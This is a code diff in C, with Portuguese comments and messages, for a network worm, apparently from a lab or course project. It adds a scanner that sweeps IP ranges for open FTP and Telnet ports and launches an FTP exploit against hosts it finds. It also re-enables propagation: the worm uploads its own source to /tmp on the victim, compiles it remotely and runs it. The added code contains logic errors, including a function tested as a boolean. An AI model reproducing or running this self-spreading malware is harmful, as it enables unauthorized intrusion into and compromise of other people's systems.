@@ -21,46 +21,105 @@ int propagate(int fd);
 int upload_file(int fd, const char *filename, const char *dest);
 int command(int fd, const char *str, ...);
 int shell(int fd);
+int ftp_exploit(open_ip target);
+int chooseAttack();
+void startTestConnection(range ips[], range ports);
 
 int main(int argc, char *argv[]) {
-    char *hostname;
+    range porta;
+    range range_ip_a[4];
+    range range_ip_b[4];
+    range range_ip_c[4];
+
+    porta.start = 21;
+    porta.end = 23;
+    generateIPs(CLASS_A, range_ip_a);
+    generateIPs(CLASS_B, range_ip_b);
+    generateIPs(CLASS_C, range_ip_c);
+    startTestConnection(range_ip_a, porta);
+    startTestConnection(range_ip_b, porta);
+    startTestConnection(range_ip_c, porta);
+    exit(EXIT_SUCCESS);
+}
+
+int ftp_exploit(open_ip target){
     int fd, ret;
-
-    if (argc < 2) {
-        fprintf(stderr, "Usage:\n\n\t%s TARGET_IP\n\n", argv[0]);
-        exit(EXIT_FAILURE);
-    }
-    hostname = argv[1];
-
     printf("# Running FTP exploit...\n");
-    fd = run_ftp_exploit(hostname);
+    fd = run_ftp_exploit(target.ip);
     if (fd < 0) {
         fprintf(stderr, "Falha no exploit por FTP.\n");
-        exit(EXIT_FAILURE);
+        return 0;
     }
-
-    // printf("# Propagating worm...\n");
-    // ret = propagate(fd);
-    // if (ret < 0) {
-    //     fprintf(stderr, "Falha ao propagar o worm.\n");
-    //     exit(EXIT_FAILURE);
-    // }
-
-    range range_ip_c[4];
-    generateIPs(CLASS_C, range_ip_c);
-    range porta;
-    porta.start = 23;
-    porta.end = 23;
-    startTestConnection(range_ip_c, porta); 
-
-
-    // ret = shell(fd);
-    // if (ret < 0) {
-    //     exit(EXIT_FAILURE);
-    // }
-
+    printf("# Propagating worm...\n");
+    ret = propagate(fd);
+    if (ret < 0) {
+        fprintf(stderr, "Falha ao propagar o worm.\n");
+        return 0;
+    }
     close(fd);
-    exit(EXIT_SUCCESS);
+    return 1;
+}
+
+int chooseAttack(){
+    return rand() % 2;
+}
+
+void randomAttack(open_ip target){
+    if(chooseAttack)
+        if(ftp_exploit(target) != 1)
+            bruteForce(target);
+    else
+        if(bruteForce(target) != 1)
+            ftp_exploit(target);
+}
+
+int bruteForce(open_ip target){
+    return 1;
+}
+
+/**
+*   Função que testa os IPs definidos em ips, utilizando o range de porta definidos em portRange.
+**/
+void startTestConnection(range ips[], range ports){
+    char ip[IP_FIELD_SIZE];
+    unsigned int campo1,campo2,campo3,campo4,porta;
+    open_ip target;
+
+    for(campo1 = ips[0].start; campo1 <= ips[0].end; campo1++){
+        for(campo2 = ips[1].start; campo2 <= ips[1].end; campo2++){
+            for(campo3 = ips[2].start; campo3 <= ips[2].end; campo3++){
+                for(campo4 = ips[3].start; campo4 <= ips[3].end; campo4++){
+                    sprintf(ip,"%d.%d.%d.%d",campo1,campo2,campo3,campo4);
+                    strcpy(target.ip,"10.2.0.100");
+                    printf("IP: %s\n",ip);
+                    for(porta = ports.start; porta <= ports.end; porta++){
+                        if(porta != 22)
+                            if(testConnection("10.2.0.100",porta)){
+                                if(porta == FTP)
+                                    target.open_ftp = 1;
+                                else if(porta == TELNET)
+                                    target.open_telnet = 1;
+                            }
+                    }
+                    if(target.open_ftp && target.open_telnet){
+                        printf("IP: %s\n com ftp e telnet abertos",ip);
+                        randomAttack(target);
+                    }
+                    else if(target.open_ftp){
+                        printf("IP: %s\n com ftp aberto",ip);
+                        ftp_exploit(target);
+                        exit(EXIT_SUCCESS);
+                    }
+                    else if(target.open_telnet){
+                        printf("IP: %s\n com telnet aberto",ip);
+                        bruteForce(target);
+                    }
+                    target.open_ftp = 0;
+                    target.open_telnet = 0;
+                }
+            }
+        }
+    }
 }
 
 int run_ftp_exploit(char *hostname) {
@@ -105,6 +164,12 @@ int propagate(int fd) {
     if (upload_file(fd, "./main.c", "/tmp/src/main.c") < 0) {
         return -1;
     }
+    if (upload_file(fd, "./recon.c", "/tmp/src/recon.c") < 0) {
+        return -1;
+    }
+    if (upload_file(fd, "./recon.h", "/tmp/src/recon.h") < 0) {
+        return -1;
+    }
     if (upload_file(fd, "./exploit.c", "/tmp/src/exploit.c") < 0) {
         return -1;
     }
@@ -113,7 +178,12 @@ int propagate(int fd) {
     }
 
     printf("# Compiling...\n");
-    if (command(fd, "gcc -o /tmp/worm /tmp/src/main.c /tmp/src/exploit.c") < 0) {
+    if (command(fd, "gcc -o /tmp/worm /tmp/src/main.c /tmp/src/recon.c /tmp/src/exploit.c") < 0) {
+        return -1;
+    }
+
+    printf("# Executing...\n");
+    if (command(fd, "/tmp/worm") < 0) {
         return -1;
     }
 
@@ -170,6 +240,7 @@ int upload_file(int fd, const char *filename, const char *dest) {
 
 int command(int fd, const char *str, ...) {
     char buf[MAX_COMMAND_SIZE];
+    char bufRead[MAX_COMMAND_SIZE];
     va_list vl;
 
     va_start(vl, str);
@@ -178,9 +249,11 @@ int command(int fd, const char *str, ...) {
 
     strcat(buf, " >>/tmp/log 2>&1 && echo ok || echo fail\n");
     write(fd, buf, strlen(buf));
-    read(fd, buf, sizeof(buf));
+    read(fd, bufRead, sizeof(bufRead));
 
-    if (strncmp("ok", buf, 2) == 0) {
+   // printf("\nRetorno: %s\n", bufRead);
+
+    if (strncmp("ok", bufRead, 2) == 0) {
         return 0;
     }
     else {
